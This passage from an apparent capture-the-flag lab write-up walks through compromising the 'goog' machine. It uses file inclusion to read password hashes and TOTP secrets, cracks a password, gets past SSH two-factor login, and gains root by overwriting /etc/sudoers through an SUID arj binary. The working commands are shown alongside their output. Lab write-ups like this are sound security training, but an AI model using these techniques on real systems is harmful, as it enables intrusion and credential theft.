In order to obtain Authentication Token, download Google Authenticator for iOS or Android and create a profile by using ND4LKCSFMUQISO6CBZQATLDP  secret key (there are many other applications that provide the same  capability with additional features, you can basically use any  application that supports TOTP). Once you define a profile, Google  Authenticator will create a token that you can use in this form.
&lt;span class=&quot;gs&quot;&gt;**If the test is successful, edit apache_credentials and tokens.json files and remove test_user**&lt;/span&gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It seems like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache_credentials&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tokens.json&lt;/code&gt; files might contain &lt;strong&gt;password hashes of users&lt;/strong&gt; and &lt;strong&gt;a secret key&lt;/strong&gt; of a current user.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;abusing-lfi-to-read-critical-files&quot;&gt;Abusing LFI to read critical files.&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache_credentials&lt;/code&gt; file.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.113.144/spool/viewresult.php?view=/opt/apache_2fa/apache_credentials

admin:$apr1$pa.RhgPO$18S/xeIW24UvBgjVJJXiC1
fox:$apr1$JWr/q2vH$KXhhk03ukqkoXjbOIoUVp/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tokens.json&lt;/code&gt; file.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.113.144/spool/viewresult.php?view=/opt/apache_2fa/tokens.json
{
  &quot;admin&quot;: &quot;ND4LKCSFMUQISO6CBZQATLDP&quot;,
  &quot;fox&quot;: &quot;RTW2ARWLJZRWUCN54UO22FDQ6I&quot;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As expected, we successfully acquire the hash password and a secret key of user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.
→ Try to crack it, we easily get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; credentials → &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox:THERESE&lt;/code&gt; 
→ Use it to login to the SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh fox@192.168.113.144
Password: 
Verification code:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the same OTP technique but use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; secret key this time, we also bypass the SSH 2FA and successfully login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;administrative-privilege-escaltion&quot;&gt;&lt;strong&gt;Administrative Privilege Escaltion&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;suid-binary&quot;&gt;SUID binary&lt;/h4&gt;
&lt;p&gt;After obtaning SSH shell, we’ll now enumerate the local target.
Lets start with SUID sticky bit binary.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:~$ find / -perm -u=s -exec ls -al {} &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
...
[...]
-rwsr-xr-x 1 root root 157192 Jan 20  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
&lt;span class=&quot;gs&quot;&gt;**-rwsr-sr-x 1 root root 386091 Feb 10  2019 /usr/bin/arj**&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The SUID &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/arj&lt;/code&gt; binary looks appealing to us. Conducting a few researches, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arj&lt;/code&gt; gives user permission to read and write to a file. Since it is set with SUID sticky bit, we essentially can manipulate any file, included all &lt;strong&gt;system-level&lt;/strong&gt; files.&lt;/p&gt;

&lt;p&gt;We first have a look into its options.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Processing archive: /usr/bin/arj
Archive created: 2019-02-10 14:50:08, modified: 2019-02-10 14:50:08
  
List of frequently used commands and switches.  Type ARJ -? &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more help.
Usage:     ARJ &amp;lt;&lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-&amp;lt;sw&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-&amp;lt;sw&amp;gt;...]] &amp;lt;archive_name&amp;gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;file_names&amp;gt;...]
Examples:  ARJ a &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; archive, ARJ e archive, ARJ l archive &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.doc
&amp;lt;Commands&amp;gt;
 ac: Add Chapter to chapter archive     l: List contents of archive
  a: Add files to archive               m: Move files to archive
  c: Comment archive files              t: Test integrity of archive
  d: Delete files from archive          u: Update files to archive
  e: Extract files from archive         v: Verbosely list contents of archive
  f: Freshen files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;archive           x: eXtract files with full pathname
&amp;lt;Switches&amp;gt;
  c: skip time-stamp Check              r: Recurse subdirectories
  e: Exclude paths from names           u: Update files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;new and newer&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  f: Freshen existing files             v: &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;multiple Volumes
  g: Garble with password               w: assign Work directory
  i: with no progress Indicator         x: eXclude selected files
  m: with Method 0, 1, 2, 3, 4          y: assume Yes on all queries
  n: only New files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not exist&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;        hk: &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;ARJ-PROTECT damage protection
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;suid-abuse&quot;&gt;SUID Abuse&lt;/h4&gt;
&lt;p&gt;Our current attack vector is to modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file and write a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; permission for our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fox&lt;/code&gt; user to execute any command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;. The following steps will reproduce the attack vector.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Archive the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/sudoers&lt;/code&gt; file.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj a &lt;span class=&quot;s2&quot;&gt;&quot;sudoers_fox&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/etc/sudoers&quot;&lt;/span&gt;
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Creating archive  : a.arj
Adding    /etc/sudoers                 53.2%    
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Read the archive.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj p sudoers_fox.arj
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Processing archive: sudoers_fox.arj
Archive created: 2021-07-22 18:02:33, modified: 2021-07-22 18:02:33
Extracting etc/sudoers                to STDOUT  &lt;span class=&quot;c&quot;&gt;#  0%&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# This file MUST be edited with the &apos;visudo&apos; command as root.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Please consider adding local content in /etc/sudoers.d/ instead of&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# directly modifying this file.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# See the man page for details on how to write a sudoers file.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
Defaults env_reset
Defaults mail_badpass
Defaults &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Host alias specification&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User alias specification&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Cmnd alias specification&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;span class=&quot;c&quot;&gt;# Allow members of group sudo to execute any command&lt;/span&gt;
%sudo &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;span class=&quot;c&quot;&gt;# See sudoers(5) for more information on &quot;#include&quot; directives:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#includedir /etc/sudoers.d&lt;/span&gt;
OK        
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Create and modify the contents of new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers&lt;/code&gt; based upon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers_fox&lt;/code&gt;’s.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano sudoers
...
Defaults env_reset
Defaults mail_badpass
Defaults &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;&lt;/span&gt;
...
&lt;span class=&quot;c&quot;&gt;# User privilege specification&lt;/span&gt;
root &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
fox &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD:ALL
&lt;span class=&quot;c&quot;&gt;# Allow members of group sudo to execute any command&lt;/span&gt;
%sudo &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL:ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
&lt;span class=&quot;c&quot;&gt;# See sudoers(5) for more information on &quot;#include&quot; directives:&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#includedir /etc/sudoers.d&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Archive newly created &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers&lt;/code&gt;.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj a &lt;span class=&quot;s2&quot;&gt;&quot;sudoers&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudoers&quot;&lt;/span&gt;
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Creating archive  : sudoers.arj
Adding    sudoers_fox                  53.8%    
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Write the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudoers&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc&lt;/code&gt;.&lt;/strong&gt;
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;fox@g00g:/dev/shm/privesc&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arj e &lt;span class=&quot;s2&quot;&gt;&quot;sudoers.arj&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/etc&quot;&lt;/span&gt;
ARJ32 v 3.10, Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1998-2004, ARJ Software Russia.
Processing archive: sudoers.arj
Archive created: 2021-07-22 18:12:43, modified: 2021-07-22 18:12:43
ARJ        704 21-07-22 18:12:24, DISK        669 20-02-02 02:41:42
/etc/sudoers               exists, Overwrite? y
Extracting sudoers                    to /etc/sudoers                OK        
  1 file&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Successful exploit will grant us permission to execute &lt;strong&gt;any&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; command under the root privilege without providing any password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@g00g:~# &lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="pg" /><category term="goog" /><category term="linux" /><summary type="html">Summary of Result</summary></entry></feed>